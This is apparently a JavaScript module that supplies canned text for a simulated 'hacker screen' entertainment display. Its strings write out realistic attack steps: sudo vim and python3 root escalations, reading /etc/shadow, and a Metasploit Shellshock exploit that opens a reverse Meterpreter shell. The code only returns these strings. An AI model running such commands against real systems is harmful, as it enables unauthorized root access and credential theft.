'use strict';

// 架空の画面データと純粋関数。DOM・通信・コマンド実行には触れない。
const SCENES = [
    {
        id: 'linux',
        title: 'Linux Terminal',
        description: '本格的なLinuxコマンドライン操作風',
        className: 'terminal'
    },
    {
        id: 'matrix',
        title: 'Matrix Code Rain',
        description: '映画「マトリックス」風のコードレイン',
        className: 'matrix'
    },
    {
        id: 'retro',
        title: 'Retro Hacker',
        description: '80年代風レトロハッカー画面',
        className: 'retro'
    },
    {
        id: 'nmap',
        title: 'Nmap Scanner',
        description: 'ネットワークスキャンツール',
        className: 'nmap'
    },
    {
        id: 'wireshark',
        title: 'Wireshark Analyzer',
        description: 'パケット解析ツール風',
        className: 'wireshark'
    },
    {
        id: 'metasploit',
        title: 'Metasploit Framework',
        description: 'ペネトレーションテストツール風',
        className: 'metasploit'
    }
];

// Linux Terminal シーン
const linuxCommands = [
    'root@hackbox:~# nmap -sS -A 192.168.1.0/24',
    'Starting Nmap 7.94 ( https://nmap.org ) at 2024-11-15 14:32 JST',
    'Nmap scan report for router.local (192.168.1.1)',
    'Host is up (0.001s latency).',
    'PORT     STATE SERVICE    VERSION',
    '22/tcp   open  ssh        OpenSSH 8.9p1',
    '80/tcp   open  http       nginx 1.18.0',
    '443/tcp  open  https      nginx 1.18.0',
    'MAC Address: AA:BB:CC:DD:EE:FF (Cisco Systems)',
    '',
    'Nmap scan report for server.local (192.168.1.100)',
    'Host is up (0.0025s latency).',
    'PORT     STATE SERVICE    VERSION',
    '21/tcp   open  ftp        vsftpd 3.0.3',
    '22/tcp   open  ssh        OpenSSH 8.9p1',
    '80/tcp   open  http       Apache httpd 2.4.41',
    '443/tcp  open  https      Apache httpd 2.4.41',
    '3306/tcp open  mysql      MySQL 8.0.27',
    '',
    'root@hackbox:~# ssh admin@192.168.1.100',
    'admin@192.168.1.100\'s password: ',
    'Last login: Thu Nov 14 18:45:23 2024 from 192.168.1.50',
    'admin@target:~$ whoami',
    'admin',
    'admin@target:~$ sudo -l',
    'User admin may run the following commands on target:',
    '    (ALL : ALL) NOPASSWD: /usr/bin/vim',
    'admin@target:~$ sudo vim -c \'!sh\' /dev/null',
    'root@target:/home/admin# id',
    'uid=0(root) gid=0(root) groups=0(root)',
    'root@target:/home/admin# cat /etc/shadow',
    'root:$6$xyz123$abc...def:19000:0:99999:7:::',
    'admin:$6$uvw456$ghi...jkl:19000:0:99999:7:::',
    'user1:$6$mno789$pqr...stu:19000:0:99999:7:::',
    '',
    'root@target:/home/admin# find / -name "*.conf" -type f 2>/dev/null | head -10',
    '/etc/apache2/apache2.conf',
    '/etc/mysql/mysql.conf.d/mysqld.conf',
    '/etc/ssh/sshd_config',
    '/etc/nginx/nginx.conf',
    '/etc/systemd/system.conf',
    '',
    'root@target:/home/admin# cat /root/flag.txt',
    'CTF{R00t_4cc355_4ch13v3d_v14_5ud0_v1m}'
];

// Retro Hacker シーン
const retroCommands = [
    '>>> INITIALIZING CYBER WARFARE TOOLKIT v2.1',
    '>>> LOADING NEURAL INTERFACE...',
    '[████████████████████████████████] 100%',
    '>>> CONNECTION TO MAINFRAME ESTABLISHED',
    '>>> IDENTITY: PHANTOM_H4CKER',
    '>>> CLEARANCE LEVEL: ALPHA-7',
    '',
    '>>> SCANNING TARGET NETWORK...',
    '>>> 192.168.0.0/16 SUBNET DETECTED',
    '>>> 2,847 HOSTS DISCOVERED',
    '>>> VULNERABILITY ASSESSMENT INITIATED',
    '',
    '[EXPLOITING] Buffer Overflow in Service Port 21',
    '[SUCCESS] Shell Access Acquired',
    '[EXPLOITING] SQL Injection in Web Portal',
    '[SUCCESS] Database Access Granted',
    '[EXPLOITING] Privilege Escalation via SUID Binary',
    '[SUCCESS] Root Access Achieved',
    '',
    '>>> INSTALLING PERSISTENT BACKDOOR...',
    '>>> BACKDOOR MODULE: SHADOW_GHOST v3.2',
    '>>> INSTALLATION COMPLETE',
    '>>> STEALTH MODE: ACTIVATED',
    '',
    '>>> EXFILTRATING CLASSIFIED DATA...',
    'financial_records.db     [████████████████] 1.2GB',
    'user_credentials.txt     [████████████████] 256MB',
    'project_blueprints.zip   [████████████████] 3.4GB',
    'government_contracts.pdf [████████████████] 89MB',
    '',
    '>>> ANTI-FORENSICS PROTOCOLS ACTIVE',
    '>>> LOG ERASURE: COMPLETE',
    '>>> TIMESTAMP MANIPULATION: COMPLETE',
    '>>> DIGITAL FINGERPRINTS: ELIMINATED',
    '',
    '>>> MISSION STATUS: OPERATION SUCCESSFUL',
    '>>> DISCONNECTING FROM MATRIX...',
    '>>> GHOST MODE ACTIVATED',
    ''
];

// Nmap Scanner シーン
const nmapCommands = [
    'Starting Nmap 7.94 ( https://nmap.org ) at 2024-11-15 14:35 JST',
    'NSE: Loaded 156 scripts for scanning.',
    'NSE: Script Pre-scanning.',
    'Initiating ARP Ping Scan at 14:35',
    'Scanning 192.168.1.0/24 [256 hosts]',
    'Completed ARP Ping Scan at 14:35, 2.15s elapsed (256 total hosts)',
    'Initiating Parallel DNS resolution of 3 hosts at 14:35',
    'Completed Parallel DNS resolution of 3 hosts at 14:35, 0.02s elapsed',
    'Initiating SYN Stealth Scan at 14:35',
    'Scanning 3 hosts [1000 ports/host]',
    'Discovered open port 443/tcp on 192.168.1.1',
    'Discovered open port 22/tcp on 192.168.1.1',
    'Discovered open port 80/tcp on 192.168.1.1',
    'Discovered open port 22/tcp on 192.168.1.100',
    'Discovered open port 3306/tcp on 192.168.1.100',
    'Discovered open port 21/tcp on 192.168.1.100',
    'Discovered open port 80/tcp on 192.168.1.100',
    'Discovered open port 443/tcp on 192.168.1.100',
    'Discovered open port 135/tcp on 192.168.1.150',
    'Discovered open port 445/tcp on 192.168.1.150',
    'Completed SYN Stealth Scan at 14:35, 8.45s elapsed (3000 total ports)',
    'Initiating Service scan at 14:35',
    'Scanning 10 services on 3 hosts',
    'Completed Service scan at 14:35, 6.12s elapsed (10 services on 3 hosts)',
    'NSE: Script scanning 3 hosts.',
    'Initiating NSE at 14:35',
    'Completed NSE at 14:35, 2.34s elapsed',
    '',
    'Nmap scan report for gateway.local (192.168.1.1)',
    'Host is up (0.0012s latency).',
    'Not shown: 997 closed ports',
    'PORT    STATE SERVICE  VERSION',
    '22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1',
    '80/tcp  open  http     nginx 1.18.0 (Ubuntu)',
    '443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)',
    'MAC Address: AA:BB:CC:DD:EE:FF (Cisco Systems)',
    'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel',
    '',
    'Nmap scan report for server.local (192.168.1.100)',
    'Host is up (0.0025s latency).',
    'Not shown: 995 closed ports',
    'PORT     STATE SERVICE  VERSION',
    '21/tcp   open  ftp      vsftpd 3.0.3',
    '22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1',
    '80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))',
    '443/tcp  open  ssl/http Apache httpd 2.4.41 ((Ubuntu))',
    '3306/tcp open  mysql    MySQL 8.0.27-0ubuntu0.20.04.1',
    'MAC Address: 11:22:33:44:55:66 (Dell Inc.)',
    'Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel',
    '',
    'Nmap scan report for workstation.local (192.168.1.150)',
    'Host is up (0.0018s latency).',
    'Not shown: 998 closed ports',
    'PORT    STATE SERVICE      VERSION',
    '135/tcp open  msrpc        Microsoft Windows RPC',
    '445/tcp open  microsoft-ds Windows 10 Pro (workgroup: WORKGROUP)',
    'MAC Address: 77:88:99:AA:BB:CC (Microsoft Corporation)',
    'Service Info: Host: DESKTOP-ABC123; OS: Windows; CPE: cpe:/o:microsoft:windows',
    '',
    'Host script results:',
    '|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s',
    '| smb-security-mode:',
    '|   account_used: guest',
    '|   authentication_level: user',
    '|   challenge_response: supported',
    '|_  message_signing: disabled (dangerous, but default)',
    '',
    'Service detection performed. Please report any incorrect results at https://nmap.org/submit/',
    'Nmap done: 256 IP addresses (3 hosts up) scanned in 19.42 seconds'
];

// Wireshark Analyzer シーン
const wiresharkData = [
    'Frame 1: 74 bytes on wire (592 bits), 74 bytes captured (592 bits)',
    '    Encapsulation type: Ethernet (1)',
    '    Arrival Time: Nov 15, 2024 14:35:42.123456789 JST',
    '    [Time shift for this packet: 0.000000000 seconds]',
    '    Epoch Time: 1731648942.123456789 seconds',
    '    [Time delta from previous captured frame: 0.000000000 seconds]',
    '    [Time delta from previous displayed frame: 0.000000000 seconds]',
    '    [Time since reference or first frame: 0.000000000 seconds]',
    '    Frame Number: 1',
    '    Frame Length: 74 bytes (592 bits)',
    '    Capture Length: 74 bytes (592 bits)',
    '',
    'Ethernet II, Src: Dell_44:55:66 (11:22:33:44:55:66), Dst: Cisco_dd:ee:ff (aa:bb:cc:dd:ee:ff)',
    '    Destination: Cisco_dd:ee:ff (aa:bb:cc:dd:ee:ff)',
    '    Source: Dell_44:55:66 (11:22:33:44:55:66)',
    '    Type: IPv4 (0x0800)',
    '',
    'Internet Protocol Version 4, Src: 192.168.1.100, Dst: 192.168.1.50',
    '    0100 .... = Version: 4',
    '    .... 0101 = Header Length: 20 bytes (5)',
    '    Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)',
    '    Total Length: 60',
    '    Identification: 0x1234 (4660)',
    '    Flags: 0x4000, Don\'t fragment',
    '    Fragment offset: 0',
    '    Time to live: 64',
    '    Protocol: TCP (6)',
    '    Header checksum: 0x7a3b [validation disabled]',
    '    [Header checksum status: Unverified]',
    '    Source: 192.168.1.100',
    '    Destination: 192.168.1.50',
    '',
    'Transmission Control Protocol, Src Port: 443, Dst Port: 55234, Seq: 0, Ack: 1, Len: 0',
    '    Source Port: 443',
    '    Destination Port: 55234',
    '    [Stream index: 0]',
    '    [TCP Segment Len: 0]',
    '    Sequence number: 0    (relative sequence number)',
    '    [Next sequence number: 1    (relative sequence number)]',
    '    Acknowledgment number: 1    (relative ack number)',
    '    1010 .... = Header Length: 40 bytes (10)',
    '    Flags: 0x012 (SYN, ACK)',
    '    Window size value: 65535',
    '    [Calculated window size: 65535]',
    '    Checksum: 0x8f2a [unverified]',
    '    [Checksum Status: Unverified]',
    '    Urgent pointer: 0',
    '    Options: (20 bytes), Maximum segment size, SACK permitted, Timestamps, No-Operation (NOP), Window scale',
    '        TCP Option - Maximum segment size: 1460 bytes',
    '        TCP Option - Window scale: 7 (multiply by 128)',
    '',
    'Frame 2: 1518 bytes on wire (12144 bits), 1518 bytes captured (12144 bits)',
    'Frame 3: 66 bytes on wire (528 bits), 66 bytes captured (528 bits)',
    'Frame 4: 118 bytes on wire (944 bits), 118 bytes captured (944 bits)',
    'Frame 5: 1434 bytes on wire (11472 bits), 1434 bytes captured (11472 bits)',
    '',
    '[Expert Info (Warning/Protocol): TCP retransmission]',
    '[TCP retransmission] [Expert Info (Note/Sequence): This frame is a (suspected) retransmission]',
    '[Expert Info (Warning/Security): Unencrypted HTTP traffic detected]',
    '[HTTP] GET /admin/login.php HTTP/1.1',
    '[HTTP] User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/91.0',
    '[HTTP] Authorization: Basic YWRtaW46cGFzc3dvcmQ='
];

// Metasploit シーン用アスキーアート
const METASPLOIT_ARTS = [
    [
        '',
        '    .:okOOOkdc\'',
        '  :kOOOOOOOOOOOk:',
        ' .xOOOOOOOOOOOOOOx.',
        ' lOOOOOOOOOOOOOOOOl',
        ' ..\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'\'.. \'',
    ],
    [
        '',
        '         .-.  .-.',
        '        /   \\/   \\',
        '       | .-.    .-. |',
        '       |/   \\  /   \\|',
        '        \\   /  \\   /',
        '         \'-\'    \'-\'',
    ],
    [
        '',
        '      /\\_/\\  /\\_/\\',
        '     ( o.o )( o.o )',
        '      > ^ <  > ^ <',
        '     /     \\/     \\',
        '    (  ||  )(  ||  )',
        '',
    ],
    [
        '',
        '    ┌─┐┌─┐┌─┐┌─┐',
        '    │ ││ ││ ││ │',
        '    └─┘└─┘└─┘└─┘',
        '     H A C K',
        '',
    ],
    [
        '',
        '       /\\_/\\',
        '      /     \\',
        '     /  ^ ^  \\',
        '    |  (o) (o) |',
        '     \\    <   /',
        '      \\  ---  /',
        '       \\_____/',
    ]
];

// アートのあとに表示する共通ログ。
const METASPLOIT_TAIL = [
    '       =[ metasploit v6.3.42-dev                          ]',
    '+ -- --=[ 2346 exploits - 1219 auxiliary - 413 post       ]',
    '+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]',
    '+ -- --=[ 9 evasion                                       ]',
    '',
    'Metasploit tip: Use the edit command to open the currently',
    'active module in your editor',
    '',
    'msf6 > use exploit/linux/http/apache_mod_cgi_bash_env_exec',
    '[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp',
    'msf6 exploit(linux/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 192.168.1.100',
    'RHOSTS => 192.168.1.100',
    'msf6 exploit(linux/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/test.sh',
    'TARGETURI => /cgi-bin/test.sh',
    'msf6 exploit(linux/http/apache_mod_cgi_bash_env_exec) > set LHOST 192.168.1.50',
    'LHOST => 192.168.1.50',
    'msf6 exploit(linux/http/apache_mod_cgi_bash_env_exec) > exploit',
    '',
    '[*] Started reverse TCP handler on 192.168.1.50:4444',
    '[*] Command Stager progress - 100.00% done (919/919 bytes)',
    '[*] Sending stage (989032 bytes) to 192.168.1.100',
    '[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:35478)',
    '',
    'meterpreter > sysinfo',
    'Computer     : server.local',
    'OS           : Ubuntu 20.04.6 LTS (Linux 5.4.0-150-generic)',
    'Architecture : x64',
    'BuildTuple   : i486-linux-musl',
    'Meterpreter  : x86/linux',
    'meterpreter > getuid',
    'Server username: www-data',
    'meterpreter > ps',
    '',
    'Process List',
    '============',
    '',
    ' PID   PPID  Name                  Arch  Session  User     Path',
    ' ---   ----  ----                  ----  -------  ----     ----',
    ' 1     0     systemd               x64   0        root     /sbin/init',
    ' 2     0     kthreadd              x64   0        root     ',
    ' 1023  1     apache2               x64   0        www-data /usr/sbin/apache2',
    ' 1537  1023  apache2               x64   0        www-data /usr/sbin/apache2',
    ' 2245  1     mysqld                x64   0        mysql    /usr/sbin/mysqld',
    '',
    'meterpreter > shell',
    'Process 1789 created.',
    'Channel 1 created.',
    'whoami',
    'www-data',
    'sudo -l',
    'Matching Defaults entries for www-data on server:',
    '    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin',
    '',
    'User www-data may run the following commands on server:',
    '    (ALL : ALL) NOPASSWD: /usr/bin/python3',
    'sudo python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
    'root@server:/var/www/html# id',
    'uid=0(root) gid=0(root) groups=0(root)',
    'root@server:/var/www/html# cat /root/flag.txt',
    'CTF{M3t45pl01t_Pwn4g3_C0mpl3t3d!}'
];

const SCENE_LINES = {
    linux: linuxCommands,
    retro: retroCommands,
    nmap: nmapCommands,
    wireshark: wiresharkData
};

/** 指定したアートと共通ログを、新しい配列として返す。 */
function metasploitLines(artIndex) {
    const index = Number.isInteger(artIndex) && artIndex >= 0 && artIndex < METASPLOIT_ARTS.length
        ? artIndex : 0;
    return METASPLOIT_ARTS[index].concat(METASPLOIT_TAIL);
}

/** 行頭・マーカーの規則で色分けし、ハッシュや説明文の部分一致を避ける。 */
function classifyLine(sceneId, text) {
    if (typeof text !== 'string') return '';
    const rules = {
        linux: [[/^(?:root|admin|user\d*)@[^\s:]+:\S*[#$]\s/, 'command-prompt']],
        retro: [
            [/\[SUCCESS\]/, 'success-text'],
            [/\[EXPLOITING\]/, 'warning-text'],
            [/^>>>/, 'info-text']
        ],
        nmap: [
            [/^Discovered open port/, 'success-text'],
            [/^(?:Starting |Initiating )/, 'info-text'],
            [/^Completed /, 'warning-text']
        ],
        wireshark: [
            [/^Frame \d+:/, 'command-prompt'],
            [/\[Expert Info/, 'warning-text'],
            [/^\[HTTP\]/, 'error-text'],
            [/^(?:Transmission Control Protocol|Internet Protocol|Ethernet II)\b/, 'info-text']
        ],
        metasploit: [
            [/^(?:msf6|meterpreter)\b/, 'command-prompt'],
            [/^\[\*\] /, 'info-text'],
            [/CTF\{/, 'success-text'],
            [/^root@/, 'error-text']
        ]
    };
    const matches = Object.hasOwn(rules, sceneId) ? rules[sceneId] : [];
    return matches.find(([pattern]) => pattern.test(text))?.[1] || '';
}

function formatTimer(seconds) {
    const remaining = Math.max(0, Math.floor(seconds));
    const minutes = Math.floor(remaining / 60);
    return `残り時間: ${minutes}:${String(remaining % 60).padStart(2, '0')}`;
}

function nextDelay(sceneId, rand) {
    switch (sceneId) {
        case 'linux': return rand * 1000 + 500;
        case 'retro': return rand * 1500 + 800;
        case 'nmap': return rand * 800 + 400;
        case 'wireshark': return rand * 600 + 300;
        case 'metasploit': return rand * 1200 + 600;
        default: return 800;
    }
}

globalThis.Scenes = {
    SCENES, SCENE_LINES, METASPLOIT_ARTS, METASPLOIT_TAIL,
    metasploitLines, classifyLine, formatTimer, nextDelay
};
if (typeof module === 'object' && module.exports) module.exports = Scenes;
